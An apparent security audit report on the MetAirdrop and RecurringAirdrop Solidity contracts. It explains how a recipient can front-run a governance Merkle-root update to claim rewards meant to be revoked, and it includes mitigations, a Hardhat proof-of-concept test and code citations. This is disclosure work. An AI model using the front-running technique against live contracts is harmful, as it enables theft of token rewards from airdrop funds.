### Title

Unprivileged airdrop recipients can front-run Merkle-root revocation and claim revoked rewards - ([contracts/utils/RecurringAirdrop.sol](contracts/utils/RecurringAirdrop.sol))

### Summary

`RecurringAirdrop.claim()` permits an account to claim against the currently stored `merkleRoot`, while `updateMerkleRoot()` immediately replaces that root without first disabling claims or checkpointing the previous allocation. [1](#0-0) [2](#0-1) 

If governance submits a new root to reduce or remove an account’s allocation, that account can observe the pending transaction and first submit `claim(amount_, oldProof_)`, thereby retaining rewards that the root update was intended to revoke. [3](#0-2) 

### Finding Description

A claim leaf is encoded as `(msg.sender, amount_)` and verified against `merkleRoot`; the claimable amount is calculated as `amount_ - claimed[msg.sender]` and then transferred to the caller. [1](#0-0) 

`updateMerkleRoot()` is restricted by `onlyGovernor`, but it performs no settlement of outstanding claims, stores no per-root claim status, and does not wait for a claim window to expire before replacing the root. [2](#0-1) 

Consequently, a pending replacement root that removes Alice does not invalidate Alice’s old proof until the transaction executes; Alice can front-run it, prove against the still-current root, increment `claimed[alice]`, and receive the amount before the governor’s revocation is applied. [4](#0-3) [3](#0-2) 

The deployed `MetAirdrop` inherits this behavior and transfers MET directly after the lock has expired, or locks MET through `esMET` before expiry; in either case, ownership of the revoked reward passes to the claiming user. [5](#0-4) [6](#0-5) 

### Impact Explanation

A targeted user can take unclaimed rewards that governance intended to remove, permanently reducing the airdrop contract’s token balance and causing direct loss of unclaimed yield. [7](#0-6) 

The attack requires only a public `claim()` transaction submitted ahead of `updateMerkleRoot()`; `nonReentrant` does not prevent transaction-order dependence, and there is no pause or claim-deadline check. [8](#0-7) [2](#0-1) 

### Likelihood Explanation

The condition arises whenever governance updates a root to correct, reduce, exclude, or otherwise revoke a previously included allocation. [9](#0-8) 

Public mempool observation is sufficient on networks with public transaction ordering, and the affected recipient already knows both their allocated amount and valid proof. [1](#0-0) 

### Recommendation

Avoid making an allocation revocable through an observable root replacement while its proof remains valid.

Suitable mitigations include:

- Add a governor-controlled claims pause and atomically pause claims before publishing a revocation transaction.
- Introduce a delay between announcing and activating a new root while explicitly disabling claims under the old root.
- Track claims per distribution root instead of using only cumulative `claimed`.
- Encode a claim deadline or distribution identifier in each leaf.
- If allocations must remain cumulative, support explicit correction entries rather than replacing a root in a way that invalidates prior proofs.

### Proof of Concept

The following Hardhat test extends the existing `MetAirdrop` fixture. Alice has an active cumulative allocation, sees a root update intended to remove her, and front-runs it with the old proof:

```ts
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {loadFixture, time} from '@nomicfoundation/hardhat-network-helpers'
import MerkleTree from 'merkletreejs'
import {parseEther} from 'ethers/lib/utils'
import {randomBytes} from 'crypto'

const generateLeaf = (account: string, amount: string): Buffer =>
  Buffer.from(
    ethers.utils
      .solidityKeccak256(['address', 'uint256'], [account, amount])
      .slice(2),
    'hex'
  )

const generateTree = (rewards: {[account: string]: string}): MerkleTree =>
  new MerkleTree(
    Object.entries(rewards).map(([account, amount]) =>
      generateLeaf(ethers.utils.getAddress(account), amount)
    ),
    ethers.utils.keccak256,
    {sortPairs: true}
  )

it('front-runs a root update that removes the recipient', async function () {
  const [governor, alice, bob] = await ethers.getSigners()

  const MetAirdrop = await ethers.getContractFactory('MetAirdrop', governor)
  const airdrop = await MetAirdrop.deploy()
  await airdrop.deployed()

  const met = await ethers.getContractAt('IERC20', await airdrop.MET())

  const aliceAmount = parseEther('100')
  const oldTree = generateTree({
    [alice.address]: aliceAmount.toString(),
    [bob.address]: parseEther('200').toString(),
  })
  const oldLeaf = generateLeaf(alice.address, aliceAmount.toString())
  const oldProof = oldTree.getHexProof(oldLeaf)

  await airdrop.updateMerkleRoot(
    oldTree.getHexRoot(),
    `0x${randomBytes(32).toString('hex')}`
  )

  // Fund the airdrop on a mainnet fork.
  await setTokenBalance(met.address, airdrop.address, parseEther('1000'))

  // Make the current distribution mature so `_transferReward` sends MET directly.
  await time.increase((await airdrop.lockPeriod()).add(1))

  // Governance creates a replacement distribution that excludes Alice.
  const revocationTree = generateTree({
    [bob.address]: parseEther('200').toString(),
  })
  const revocationRoot = revocationTree.getHexRoot()

  // Alice observes the pending `updateMerkleRoot(revocationRoot, ...)` and claims first.
  await airdrop.connect(alice).claim(aliceAmount.toString(), oldProof)

  expect(await met.balanceOf(alice.address)).to.eq(aliceAmount)
  expect(await airdrop.claimed(alice.address)).to.eq(aliceAmount)

  // The intended revocation only becomes active afterward.
  await airdrop.updateMerkleRoot(
    revocationRoot,
    `0x${randomBytes(32).toString('hex')}`
  )

  // The old proof is now invalid, but the revoked funds have already been taken.
  await expect(
    airdrop.connect(alice).claim(aliceAmount.toString(), oldProof)
  ).to.be.revertedWithCustomError(airdrop, 'InvalidProof')
})
```

### Citations

**File:** contracts/utils/RecurringAirdrop.sol (L24-34)
```text
    /// @notice The merkle root for the current distribution
    bytes32 public merkleRoot;

    /// @notice The proofs file's IPFS hash
    bytes32 public proofsFileHash;

    /// @notice The timestamp of the latest merkle root update
    uint256 public updatedAt;

    /// @notice The Accumulated amount claimed for a given account
    mapping(address => uint256) public claimed;
```

**File:** contracts/utils/RecurringAirdrop.sol (L52-63)
```text
    function claim(uint256 amount_, bytes32[] calldata proof_) external nonReentrant {
        if (merkleRoot == bytes32(0)) revert NothingToClaim();

        bytes32 _leaf = keccak256(abi.encodePacked(msg.sender, amount_));
        if (!MerkleProof.verify(proof_, merkleRoot, _leaf)) revert InvalidProof();

        uint256 _claimable = amount_ - claimed[msg.sender];
        if (_claimable == 0) revert NothingToClaim();

        claimed[msg.sender] += _claimable;

        _transferReward(msg.sender, _claimable);
```

**File:** contracts/utils/RecurringAirdrop.sol (L81-89)
```text
    function updateMerkleRoot(bytes32 merkleRoot_, bytes32 proofsFileHash_) external onlyGovernor {
        if (merkleRoot_ == merkleRoot) revert NewMerkleRootSameAsCurrent();
        if (proofsFileHash_ == bytes32(0)) revert ProofsFileIsNull();

        merkleRoot = merkleRoot_;
        updatedAt = block.timestamp;
        proofsFileHash = proofsFileHash_;

        emit MerkleRootUpdated(merkleRoot_, block.timestamp);
```

**File:** contracts/MetAirdrop.sol (L14-24)
```text
contract MetAirdrop is RecurringAirdrop {
    using SafeERC20 for IERC20;
    using Math for uint256;

    IESMET public constant ESMET = IESMET(0xA28D70795a61Dc925D4c220762A4344803876bb8);
    IERC20 public constant MET = IERC20(0x2Ebd53d035150f328bd754D6DC66B99B0eDB89aa);

    /// @notice For how long `MET` tokens will be locked
    uint256 public lockPeriod = 7 days;

    constructor() RecurringAirdrop(MET) {}
```

**File:** contracts/MetAirdrop.sol (L31-48)
```text
    function _transferReward(address to_, uint256 amount_) internal override {
        uint256 _end = updatedAt + lockPeriod;

        if (_end < block.timestamp) {
            MET.safeTransfer(to_, amount_);
            return;
        }

        uint256 _min = ESMET.MINIMUM_LOCK_PERIOD() + 1;
        uint256 _max = ESMET.MAXIMUM_LOCK_PERIOD();

        // Ensures valid lock period
        uint256 _remainLockPeriod = Math.min(Math.max(_end - block.timestamp, _min), _max);

        token.safeApprove(address(ESMET), 0);
        token.safeApprove(address(ESMET), amount_);
        ESMET.lockFor(to_, amount_, _remainLockPeriod);
    }
```
